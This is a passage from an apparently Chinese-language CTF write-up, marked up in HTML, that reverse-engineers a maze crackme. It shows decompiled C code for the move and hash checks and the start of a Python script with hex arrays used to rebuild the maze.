(*(<span class="type">unsigned</span> __int8 *)(a1 - <span class="number">33</span>) ^ (<span class="number">16777619</span></span><br><span class="line">                                         * (*(<span class="type">unsigned</span> __int8 *)(a1 - <span class="number">34</span>) ^ (<span class="number">16777619</span></span><br><span class="line">                                                                           * (BYTE1(v4) ^ (<span class="number">16777619</span></span><br><span class="line">                                                                                         * ((<span class="type">unsigned</span> __int8)v4 ^ <span class="number">0x50C5D1F</span>))))))) != <span class="number">0x618FF339</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;:(&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">41</span>; ++i )</span><br><span class="line">      <span class="built_in">putchar</span>((<span class="type">unsigned</span> __int8)(*(_BYTE *)(a1 + i - <span class="number">128</span>) + *(_BYTE *)(a1 + i - <span class="number">84</span>)));</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(a1 - <span class="number">40</span>) = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    choice = road[v1];</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:                                 <span class="comment">// 向上</span></span><br><span class="line">        *(_DWORD *)(a1 - <span class="number">32</span>) = --v5;</span><br><span class="line">        v3 -= <span class="number">21</span>;</span><br><span class="line">        *(_DWORD *)(a1 - <span class="number">40</span>) = v3;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;j&#x27;</span>:                                 <span class="comment">// 向下</span></span><br><span class="line">        *(_DWORD *)(a1 - <span class="number">32</span>) = v5 + <span class="number">1</span>;</span><br><span class="line">        *(_DWORD *)(a1 - <span class="number">40</span>) = v3 + <span class="number">21</span>;</span><br><span class="line">        v4 = *(_DWORD *)(a1 - <span class="number">36</span>);</span><br><span class="line">        v5 = *(_DWORD *)(a1 - <span class="number">32</span>);</span><br><span class="line">        v3 = *(_DWORD *)(a1 - <span class="number">40</span>);</span><br><span class="line">        v1 = *(_DWORD *)(a1 - <span class="number">136</span>);</span><br><span class="line">        road = *(<span class="type">const</span> <span class="type">char</span> **)(a1 - <span class="number">132</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>:                                 <span class="comment">// 向左</span></span><br><span class="line">        --v4;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:                                 <span class="comment">// 向右</span></span><br><span class="line">        ++v4;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(a1 - <span class="number">36</span>) = v4;</span><br><span class="line">LABEL_12:</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span></span><br><span class="line">      || v4 &lt; <span class="number">0</span></span><br><span class="line">      || v5 &gt;= <span class="number">21</span></span><br><span class="line">      || v4 &gt;= <span class="number">21</span></span><br><span class="line">        <span class="comment">// 迷宫的生成</span></span><br><span class="line">      || (v5 ^ (v4 &lt;&lt; <span class="number">8</span>) ^ dword_4043C8[v3 + v4] ^ (<span class="type">unsigned</span> __int8)byte_404208[v3 + v4]) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(a1 - <span class="number">136</span>) = ++v1;</span><br><span class="line">    v7 = <span class="built_in">strlen</span>(road);</span><br><span class="line">    v3 = *(_DWORD *)(a1 - <span class="number">40</span>);</span><br><span class="line">    road = *(<span class="type">const</span> <span class="type">char</span> **)(a1 - <span class="number">132</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= v7 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以清晰得看到迷宫的生成和迷宫的出口，以下是生成迷宫的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">s1 = [<span class="number">0x00000044</span>, <span class="number">0x00000124</span>, <span class="number">0x000002BD</span>, <span class="number">0x0000033E</span>, <span class="number">0x00000432</span>, <span class="number">0x0000059D</span>, <span class="number">0x0000068F</span>, <span class="number">0x00000753</span>, <span class="number">0x000008CC</span>,</span><br><span class="line">      <span class="number">0x0000094F</span>, <span class="number">0x00000A8D</span>, <span class="number">0x00000B2C</span>, <span class="number">0x00000C7C</span>, <span class="number">0x00000DF2</span>, <span class="number">0x00000EBA</span>, <span class="number">0x00000F30</span>, <span class="number">0x0000100D</span>, <span class="number">0x000011C7</span>,</span><br><span class="line">      <span class="number">0x00001257</span>, <span class="number">0x00001319</span>, <span class="number">0x00001491</span>, <span class="number">0x000000F4</span>, <span class="number">0x000001E7</span>, <span class="number">0x00000229</span>, <span class="number">0x0000034F</span>, <span class="number">0x000004EE</span>, <span class="number">0x00000547</span>,</span><br><span class="line">      <span class="number">0x0000067C</span>, <span class="number">0x000007D8</span>, <span class="number">0x000008F8</span>, <span class="number">0x000009D8</span>, <span class="number">0x00000A79</span>, <span class="number">0x00000BD1</span>, <span class="number">0x00000C7A</span>, <span class="number">0x00000D32</span>, <span class="number">0x00000E82</span>,</span><br><span class="line">      <span class="number">0x00000FD9</span>, <span class="number">0x000010DF</span>, <span class="number">0x00001120</span>, <span class="number">0x000012D6</span>, <span class="number">0x000013EE</span>, <span class="number">0x0000145F</span>, <span class="number">0x00000027</span>, <span class="number">0x0000016C</span>, <span class="number">0x00000265</span>,</span><br><span class="line">      <span class="number">0x000003B7</span>, <span class="number">0x0000049F</span>, <span class="number">0x0000054B</span>, <span class="number">0x000006C8</span>, <span class="number">0x000007DF</span>, <span class="number">0x00000866</span>, <span class="number">0x0000099F</span>, <span class="number">0x00000A0C</span>, <span class="number">0x00000B2D</span>,</span><br><span class="line">      <span class="number">0x00000C0C</span>, <span class="number">0x00000DBF</span>, <span class="number">0x00000E19</span>, <span class="number">0x00000F83</span>, <span class="number">0x000010F1</span>, <span class="number">0x00001169</span>, <span class="number">0x0000125C</span>, <span class="number">0x000013A3</span>, <span class="number">0x000014AE</span>,</span><br><span class="line">      <span class="number">0x0000000C</span>, <span class="number">0x00000164</span>, <span class="number">0x00000274</span>, <span class="number">0x0000033D</span>, <span class="number">0x000004BD</span>, <span class="number">0x00000582</span>, <span class="number">0x00000696</span>, <span class="number">0x00000784</span>, <span class="number">0x00000846</span>,</span><br><span class="line">      <span class="number">0x000009AB</span>, <span class="number">0x00000ABA</span>, <span class="number">0x00000BBA</span>, <span class="number">0x00000CFC</span>, <span class="number">0x00000DB7</span>, <span class="number">0x00000E18</span>, <span class="number">0x00000F96</span>, <span class="number">0x0000106C</span>, <span class="number">0x00001138</span>,</span><br><span class="line">      <span class="number">0x00001267</span>, <span class="number">0x000013F5</span>, <span class="number">0x00001481</span>, <span class="number">0x00000072</span>, <span class="number">0x0000010E</span>, <span class="number">0x0000022C</span>, <span class="number">0x000003AF</span>, <span class="number">0x00000489</span>, <span class="number">0x000005B3</span>,</span><br><span class="line">      <span class="number">0x000006B3</span>, <span class="number">0x000007C5</span>, <span class="number">0x0000080B</span>, <span class="number">0x0000091E</span>, <span class="number">0x00000A3E</span>, <span class="number">0x00000BF8</span>, <span class="number">0x00000C73</span>, <span class="number">0x00000D75</span>, <span class="number">0x00000EE2</span>,</span><br><span class="line">      <span class="number">0x00000F5A</span>, <span class="number">0x00001038</span>, <span class="number">0x0000119A</span>, <span class="number">0x000012E9</span>, <span class="number">0x0000133F</span>, <span class="number">0x00001487</span>, <span class="number">0x000000AA</span>, <span class="number">0x00000137</span>, <span class="number">0x00000298</span>,</span><br><span class="line">      <span class="number">0x00000346</span>, <span class="number">0x000004D3</span>, <span class="number">0x000005D5</span>, <span class="number">0x0000069E</span>, <span class="number">0x00000711</span>, <span class="number">0x000008B8</span>, <span class="number">0x0000097D</span>, <span class="number">0x00000AD9</span>, <span class="number">0x00000BD3</span>,</span><br><span class="line">      <span class="number">0x00000CC7</span>, <span class="number">0x00000D18</span>, <span class="number">0x00000E51</span>, <span class="number">0x00000FB7</span>, <span class="number">0x000010CB</span>, <span class="number">0x000011FC</span>, <span class="number">0x00001274</span>, <span class="number">0x00001396</span>, <span class="number">0x00001441</span>,</span><br><span class="line">      <span class="number">0x00000082</span>, <span class="number">0x000001A5</span>, <span class="number">0x0000025F</span>, <span class="number">0x000003E8</span>, <span class="number">0x00000487</span>, <span class="number">0x00000528</span>, <span class="number">0x000006F7</span>, <span class="number">0x00000797</span>, <span class="number">0x000008F3</span>,</span><br><span class="line">      <span class="number">0x000009AC</span>, <span class="number">0x00000ADC</span>, <span class="number">0x00000B65</span>, <span class="number">0x00000C73</span>, <span class="number">0x00000DE6</span>, <span class="number">0x00000EBC</span>, <span class="number">0x00000FCD</span>, <span class="number">0x000010C3</span>, <span class="number">0x000011AB</span>,</span><br><span class="line">      <span class="number">0x0000123F</span>, <span class="number">0x000013A0</span>, <span class="number">0x00001450</span>, <span class="number">0x00000043</span>, <span class="number">0x00000122</span>, <span class="number">0x000002AD</span>, <span class="number">0x000003CD</span>, <span class="number">0x0000042D</span>, <span class="number">0x00000537</span>,</span><br><span class="line">      <span class="number">0x00000692</span>, <span class="number">0x000007DB</span>, <span class="number">0x00000810</span>, <span class="number">0x00000936</span>, <span class="number">0x00000A49</span>, <span class="number">0x00000B65</span>, <span class="number">0x00000C3E</span>, <span class="number">0x00000DA3</span>, <span class="number">0x00000E1B</span>,</span><br><span class="line">      <span class="number">0x00000F95</span>, <span class="number">0x000010E6</span>, <span class="number">0x000011AF</span>, <span class="number">0x00001228</span>, <span class="number">0x000013B5</span>, <span class="number">0x00001448</span>, <span class="number">0x0000002F</span>, <span class="number">0x0000015B</span>, <span class="number">0x0000024E</span>,</span><br><span class="line">      <span class="number">0x0000032A</span>, <span class="number">0x000004D2</span>, <span class="number">0x0000053C</span>, <span class="number">0x000006D6</span>, <span class="number">0x000007C9</span>, <span class="number">0x0000082F</span>, <span class="number">0x00000957</span>, <span class="number">0x00000AE2</span>, <span class="number">0x00000B26</span>,</span><br><span class="line">      <span class="number">0x00000C98</span>, <span class="number">0x00000D57</span>, <span class="number">0x00000EC3</span>, <span class="number">0x00000FC2</span>, <span class="number">0x000010DE</span>, <span class="number">0x00001118</span>, <span class="number">0x000012AB</span>, <span class="number">0x00001386</span>, <span class="number">0x0000144F</span>,</span><br><span class="line">      <span class="number">0x000000D5</span>, <span class="number">0x000001C9</span>, <span class="number">0x000002F3</span>, <span class="number">0x000003E7</span>, <span class="number">0x000004C6</span>, <span class="number">0x000005C0</span>, <span class="number">0x000006C2</span>, <span class="number">0x000007D1</span>, <span class="number">0x000008F0</span>,</span><br><span class="line">      <span class="number">0x000009B0</span>, <span class="number">0x00000A1D</span>, <span class="number">0x00000B3D</span>, <span class="number">0x00000C2A</span>, <span class="number">0x00000D62</span>, <span class="number">0x00000E64</span>, <span class="number">0x00000F20</span>, <span class="number">0x000010FF</span>, <span class="number">0x000011EA</span>,</span><br><span class="line">      <span class="number">0x00001217</span>, <span class="number">0x000013F0</span>, <span class="number">0x000014F6</span>, <span class="number">0x000000E0</span>, <span class="number">0x000001F0</span>, <span class="number">0x000002E2</span>, <span class="number">0x0000037B</span>, <span class="number">0x00000456</span>, <span class="number">0x000005DE</span>,</span><br><span class="line">      <span class="number">0x000006E6</span>, <span class="number">0x00000772</span>, <span class="number">0x000008DF</span>, <span class="number">0x00000970</span>, <span class="number">0x00000A29</span>, <span class="number">0x00000B16</span>, <span class="number">0x00000C62</span>, <span class="number">0x00000DFB</span>, <span class="number">0x00000E33</span>,</span><br><span class="line">      <span class="number">0x00000F6A</span>, <span class="number">0x000010C8</span>, <span class="number">0x000011B2</span>, <span class="number">0x00001271</span>, <span class="number">0x000013F8</span>, <span class="number">0x000014C8</span>, <span class="number">0x000000A9</span>, <span class="number">0x00000192</span>, <span class="number">0x0000026F</span>,</span><br><span class="line">      <span class="number">0x00000342</span>, <span class="number">0x000004A7</span>, <span class="number">0x00000533</span>, <span class="number">0x0000065F</span>, <span class="number">0x00000707</span>, <span class="number">0x000008B9</span>, <span class="number">0x00000900</span>, <span class="number">0x00000ADC</span>, <span class="number">0x00000B90</span>,</span><br><span class="line">      <span class="number">0x00000C4C</span>, <span class="number">0x00000D7B</span>, <span class="number">0x00000E81</span>, <span class="number">0x00000FC7</span>, <span class="number">0x00001004</span>, <span class="number">0x0000118D</span>, <span class="number">0x000012C0</span>, <span class="number">0x00001375</span>, <span class="number">0x000014EB</span>,</span><br><span class="line">      <span class="number">0x000000A7</span>, <span class="number">0x00000147</span>, <span class="number">0x000002C6</span>, <span class="number">0x00000374</span>, <span class="number">0x0000044F</span>, <span class="number">0x000005EE</span>, <span class="number">0x0000066D</span>, <span class="number">0x00000719</span>, <span class="number">0x00000807</span>,</span><br><span class="line">      <span class="number">0x00000970</span>, <span class="number">0x00000A07</span>, <span class="number">0x00000BD5</span>, <span class="number">0x00000C18</span>, <span class="number">0x00000D4D</span>, <span class="number">0x00000EFE</span>, <span class="number">0x00000F20</span>, <span class="number">0x00001021</span>, <span class="number">0x0000116C</span>,</span><br><span class="line">      <span class="number">0x00001218</span>, <span class="number">0x000013CC</span>, <span class="number">0x0000144F</span>, <span class="number">0x000000A8</span>, <span class="number">0x00000117</span>, <span class="number">0x000002CA</span>, <span class="number">0x0000033F</span>, <span class="number">0x000004C5</span>, <span class="number">0x00000585</span>,</span><br><span class="line">      <span class="number">0x000006BB</span>, <span class="number">0x0000073A</span>, <span class="number">0x000008C8</span>, <span class="number">0x0000095A</span>, <span class="number">0x00000A8D</span>, <span class="number">0x00000B2F</span>, <span class="number">0x00000CC6</span>, <span class="number">0x00000DD8</span>, <span class="number">0x00000EFD</span>,</span><br><span class="line">      <span class="number">0x00000F73</span>, <span class="number">0x000010F8</span>, <span class="number">0x00001168</span>, <span class="number">0x00001280</span>, <span class="number">0x0000137E</span>, <span class="number">0x00001466</span>, <span class="number">0x000000AA</span>, <span class="number">0x00000194</span>, <span class="number">0x000002E0</span>,</span><br><span class="line">      <span class="number">0x000003A2</span>, <span class="number">0x000004B4</span>, <span class="number">0x0000057F</span>, <span class="number">0x00000640</span>, <span class="number">0x000007D0</span>, <span class="number">0x00000865</span>, <span class="number">0x00000986</span>, <span class="number">0x00000A38</span>, <span class="number">0x00000B13</span>,</span><br><span class="line">      <span class="number">0x00000C7C</span>, <span class="number">0x00000DBF</span>, <span class="number">0x00000EFE</span>, <span class="number">0x00000F95</span>, <span class="number">0x00001066</span>, <span class="number">0x00001117</span>, <span class="number">0x000012BE</span>, <span class="number">0x00001373</span>, <span class="number">0x000014E4</span>,</span><br><span class="line">      <span class="number">0x000000F9</span>, <span class="number">0x0000015F</span>, <span class="number">0x0000026C</span>, <span class="number">0x000003DF</span>, <span class="number">0x00000434</span>, <span class="number">0x00000569</span>, <span class="number">0x00000658</span>, <span class="number">0x00000768</span>, <span class="number">0x000008B4</span>,</span><br><span class="line">      <span class="number">0x00000976</span>, <span class="number">0x00000A56</span>, <span class="number">0x00000B68</span>, <span class="number">0x00000CBF</span>, <span class="number">0x00000DCB</span>, <span class="number">0x00000E81</span>, <span class="number">0x00000FE7</span>, <span class="number">0x00001062</span>, <span class="number">0x00001196</span>,</span><br><span class="line">      <span class="number">0x00001233</span>, <span class="number">0x000013FE</span>, <span class="number">0x00001486</span>, <span class="number">0x000000E7</span>, <span class="number">0x000001AF</span>, <span class="number">0x00000205</span>, <span class="number">0x00000371</span>, <span class="number">0x00000482</span>, <span class="number">0x000005F0</span>,</span><br><span class="line">      <span class="number">0x00000670</span>, <span class="number">0x0000072E</span>, <span class="number">0x00000849</span>, <span class="number">0x00000925</span>, <span class="number">0x00000A5B</span>, <span class="number">0x00000B0E</span>, <span class="number">0x00000C7F</span>, <span class="number">0x00000D75</span>, <span class="number">0x00000EF4</span>,</span><br><span class="line">      <span class="number">0x00000F61</span>, <span class="number">0x0000101D</span>, <span class="number">0x0000116B</span>, <span class="number">0x0000127E</span>, <span class="number">0x00001382</span>, <span class="number">0x00001404</span>, <span class="number">0x0000004D</span>, <span class="number">0x0000015C</span>, <span class="number">0x0000027F</span>,</span><br><span class="line">      <span class="number">0x0000033F</span>, <span class="number">0x00000442</span>, <span class="number">0x000005B6</span>, <span class="number">0x0000064D</span>, <span class="number">0x00000780</span>, <span class="number">0x0000086B</span>, <span class="number">0x000009DC</span>, <span class="number">0x00000AF1</span>, <span class="number">0x00000B79</span>,</span><br><span class="line">      <span class="number">0x00000C66</span>, <span class="number">0x00000D6E</span>, <span class="number">0x00000E9D</span>, <span class="number">0x00000F23</span>, <span class="number">0x0000107B</span>, <span class="number">0x00001126</span>, <span class="number">0x000012D5</span>, <span class="number">0x0000133F</span>, <span class="number">0x000014AE</span>,</span><br><span class="line">      <span class="number">0x0000007D</span>, <span class="number">0x000001AD</span>, <span class="number">0x000002BB</span>, <span class="number">0x000003A1</span>, <span class="number">0x00000473</span>, <span class="number">0x0000054E</span>, <span class="number">0x000006C0</span>, <span class="number">0x000007D0</span>, <span class="number">0x0000083F</span>,</span><br><span class="line">      <span class="number">0x000009DA</span>, <span class="number">0x00000AE6</span>, <span class="number">0x00000BA9</span>, <span class="number">0x00000CA0</span>, <span class="number">0x00000DC3</span>, <span class="number">0x00000E30</span>, <span class="number">0x00000F8E</span>, <span class="number">0x00001066</span>, <span class="number">0x000011CD</span>,</span><br><span class="line">      <span class="number">0x0000124B</span>, <span class="number">0x00001361</span>, <span class="number">0x000014B8</span>, <span class="number">0x000000EE</span>, <span class="number">0x0000016D</span>, <span class="number">0x00000275</span>, <span class="number">0x0000033C</span>, <span class="number">0x00000473</span>, <span class="number">0x000005A8</span>,</span><br><span class="line">      <span class="number">0x00000679</span>, <span class="number">0x00000759</span>, <span class="number">0x0000080B</span>, <span class="number">0x000009B4</span>, <span class="number">0x00000AC7</span>, <span class="number">0x00000B03</span>, <span class="number">0x00000C07</span>, <span class="number">0x00000DAE</span>, <span class="number">0x00000E82</span>,</span><br><span class="line">      <span class="number">0x00000FF8</span>, <span class="number">0x00001050</span>, <span class="number">0x000011DF</span>, <span class="number">0x00001261</span>, <span class="number">0x000013A0</span>, <span class="number">0x000014D5</span>, <span class="number">0x00000053</span>, <span class="number">0x000001B7</span>, <span class="number">0x000002D8</span>,</span><br><span class="line">      <span class="number">0x000003B8</span>, <span class="number">0x00000478</span>, <span class="number">0x000005BC</span>, <span class="number">0x000006CC</span>, <span class="number">0x000007DE</span>, <span class="number">0x000008C6</span>, <span class="number">0x00000990</span>, <span class="number">0x00000A3F</span>, <span class="number">0x00000B21</span>,</span><br><span class="line">      <span class="number">0x00000CBF</span>, <span class="number">0x00000DBB</span>, <span class="number">0x00000EDC</span>, <span class="number">0x00000FB1</span>, <span class="number">0x0000103B</span>, <span class="number">0x0000116B</span>, <span class="number">0x0000126B</span>, <span class="number">0x000013E0</span>, <span class="number">0x00001434</span>]</span><br><span class="line"></span><br><span class="line">s2 = [<span class="number">0x45</span>, <span class="number">0x24</span>, <span class="number">0xBD</span>, <span class="number">0x3E</span>, <span class="number">0x32</span>, <span class="number">0x9D</span>, <span class="number">0x8F</span>, <span class="number">0x53</span>, <span class="number">0xCC</span>, <span class="number">0x4F</span>, <span class="number">0x8D</span>, <span class="number">0x2C</span>, <span class="number">0x7C</span>, <span class="number">0xF2</span>, <span class="number">0xBA</span>, <span class="number">0x30</span>, <span class="number">0x0D</span>, <span class="number">0xC7</span>,</span><br><span class="line">      <span class="number">0x57</span>, <span class="number">0x19</span>, <span class="number">0x91</span>, <span class="number">0xF4</span>, <span class="number">0xE6</span>, <span class="number">0x28</span>, <span class="number">0x4F</span>, <span class="number">0xEE</span>, <span class="number">0x47</span>, <span class="number">0x7C</span>, <span class="number">0xD8</span>, <span class="number">0xF8</span>, <span class="number">0xD8</span>, <span class="number">0x79</span>, <span class="number">0xD1</span>, <span class="number">0x7A</span>, <span class="number">0x32</span>, <span class="number">0x82</span>,</span><br><span class="line">      <span class="number">0xD9</span>, <span class="number">0xDF</span>, <span class="number">0x20</span>, <span class="number">0xD6</span>, <span class="number">0xEF</span>, <span class="number">0x5E</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0xB4</span>, <span class="number">0x9D</span>, <span class="number">0x49</span>, <span class="number">0xCA</span>, <span class="number">0xDD</span>, <span class="number">0x64</span>, <span class="number">0x9D</span>, <span class="number">0x0E</span>, <span class="number">0x2F</span>,</span><br><span class="line">      <span class="number">0x0E</span>, <span class="number">0xBD</span>, <span class="number">0x1B</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0x6B</span>, <span class="number">0x5F</span>, <span class="number">0xA1</span>, <span class="number">0xAC</span>, <span class="number">0x0E</span>, <span class="number">0x66</span>, <span class="number">0x76</span>, <span class="number">0x3F</span>, <span class="number">0xBF</span>, <span class="number">0x80</span>, <span class="number">0x94</span>, <span class="number">0x86</span>, <span class="number">0x44</span>,</span><br><span class="line">      <span class="number">0xA9</span>, <span class="number">0xB8</span>, <span class="number">0xB8</span>, <span class="number">0xFE</span>, <span class="number">0xB5</span>, <span class="number">0x1A</span>, <span class="number">0x94</span>, <span class="number">0x6F</span>, <span class="number">0x3B</span>, <span class="number">0x64</span>, <span class="number">0xF6</span>, <span class="number">0x82</span>, <span class="number">0x76</span>, <span class="number">0x0A</span>, <span class="number">0x28</span>, <span class="number">0xAB</span>, <span class="number">0x8D</span>, <span class="number">0xB7</span>,</span><br><span class="line">      <span class="number">0xB7</span>, <span class="number">0xC1</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x3A</span>, <span class="number">0xFC</span>, <span class="number">0x77</span>, <span class="number">0x71</span>, <span class="number">0xE6</span>, <span class="number">0x5F</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0x83</span>, <span class="number">0xAF</span>, <span class="number">0x32</span>, <span class="number">0x9D</span>,</span><br><span class="line">      <span class="number">0x43</span>, <span class="number">0xD6</span>, <span class="number">0xD0</span>, <span class="number">0x9B</span>, <span class="number">0x14</span>, <span class="number">0xBD</span>, <span class="number">0x78</span>, <span class="number">0xDC</span>, <span class="number">0xD6</span>, <span class="number">0xC2</span>, <span class="number">0x1D</span>, <span class="number">0x54</span>, <span class="number">0xB3</span>, <span class="number">0xCE</span>, <span class="number">0xF8</span>, <span class="number">0x71</span>, <span class="number">0x92</span>, <span class="number">0x44</span>,</span><br><span class="line">      <span class="number">0x85</span>, <span class="number">0xA2</span>, <span class="number">0x58</span>, <span class="number">0xEF</span>, <span class="number">0x80</span>, <span class="number">0x2F</span>, <span class="number">0xF0</span>, <span class="number">0x90</span>, <span class="number">0xF4</span>, <span class="number">0xAB</span>, <span class="number">0xDB</span>, <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0xE1</span>, <span class="number">0xBB</span>, <span class="number">0xCA</span>, <span class="number">0xC5</span>, <span class="number">0xAC</span>,</span><br><span class="line">      <span class="number">0x39</span>, <span class="number">0xA7</span>, <span class="number">0x56</span>, <span class="number">0x45</span>, <span class="number">0x25</span>, <span class="number">0xAA</span>, <span class="number">0xCA</span>, <span class="number">0x2A</span>, <span class="number">0x30</span>, <span class="number">0x95</span>, <span class="number">0xDC</span>, <span class="number">0x17</span>, <span class="number">0x31</span>, <span class="number">0x4F</span>, <span class="number">0x62</span>, <span class="number">0x39</span>, <span class="number">0xA4</span>, <span class="number">0x1C</span>,</span><br><span class="line">      <span class="number">0x93</span>, <span class="number">0xE1</span>, <span class="number">0xA9</span>, <span class="number">0x2F</span>, <span class="number">0xB3</span>, <span class="number">0x4F</span>, <span class="number">0x26</span>, <span class="number">0x53</span>, <span class="number">0x47</span>, <span class="number">0x23</span>, <span class="number">0xDB</span>, <span class="number">0x34</span>, <span class="number">0xDE</span>, <span class="number">0xC1</span>, <span class="number">0x27</span>, <span class="number">0x5F</span>, <span class="number">0xEB</span>, <span class="number">0x2E</span>,</span><br><span class="line">      <span class="number">0x91</span>, <span class="number">0x5E</span>, <span class="number">0xCA</span>, <span class="number">0xCB</span>, <span class="number">0xD6</span>, <span class="number">0x11</span>, <span class="number">0xA3</span>, <span class="number">0x8F</span>, <span class="number">0x47</span>, <span class="number">0xDD</span>, <span class="number">0xC0</span>, <span class="number">0xFB</span>, <span class="number">0xEE</span>, <span class="number">0xCF</span>, <span class="number">0xC9</span>, <span class="number">0xCA</span>, <span class="number">0xD9</span>, <span class="number">0xF8</span>,</span><br><span class="line">      <span class="number">0xB9</span>, <span class="number">0x15</span>, <span class="number">0x34</span>, <span class="number">0x23</span>, <span class="number">0x6B</span>, <span class="number">0x6D</span>, <span class="number">0x28</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x1E</span>, <span class="number">0xF8</span>, <span class="number">0xFF</span>, <span class="number">0xEB</span>, <span class="number">0xFB</span>, <span class="number">0xE9</span>, <span class="number">0x70</span>, <span class="number">0x5C</span>, <span class="number">0xD4</span>,</span><br><span class="line">      <span class="number">0xED</span>, <span class="number">0x78</span>, <span class="number">0xD4</span>, <span class="number">0x7A</span>, <span class="number">0x22</span>, <span class="number">0x1C</span>, <span class="number">0x69</span>, <span class="number">0xF1</span>, <span class="number">0x39</span>, <span class="number">0x61</span>, <span class="number">0xC2</span>, <span class="number">0xB9</span>, <span class="number">0x7B</span>, <span class="number">0xF3</span>, <span class="number">0xC2</span>, <span class="number">0xA2</span>, <span class="number">0x99</span>, <span class="number">0x64</span>,</span><br><span class="line">      <span class="number">0x48</span>, <span class="number">0xAC</span>, <span class="number">0x38</span>, <span class="number">0x55</span>, <span class="number">0x0C</span>, <span class="number">0xB3</span>, <span class="number">0x0B</span>, <span class="number">0xD6</span>, <span class="number">0x9B</span>, <span class="number">0x46</span>, <span class="number">0x70</span>, <span class="number">0x8B</span>, <span class="number">0xCD</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0xCB</span>, <span class="number">0x7F</span>, <span class="number">0xE0</span>,</span><br><span class="line">      <span class="number">0xAB</span>, <span class="number">0x4A</span>, <span class="number">0xCB</span>, <span class="number">0x79</span>, <span class="number">0x43</span>, <span class="number">0xE2</span>, <span class="number">0x60</span>, <span class="number">0x15</span>, <span class="number">0x0A</span>, <span class="number">0x7C</span>, <span class="number">0x0A</span>, <span class="number">0xD9</span>, <span class="number">0x15</span>, <span class="number">0x41</span>, <span class="number">0xF3</span>, <span class="number">0x2C</span>, <span class="number">0x2C</span>, <span class="number">0x61</span>,</span><br><span class="line">      <span class="number">0x14</span>, <span class="number">0xC1</span>, <span class="number">0x43</span>, <span class="number">0xA5</span>, <span class="number">0x1A</span>, <span class="number">0xC7</span>, <span class="number">0x33</span>, <span class="number">0xC9</span>, <span class="number">0x89</span>, <span class="number">0xB7</span>, <span class="number">0x37</span>, <span class="number">0xC4</span>, <span 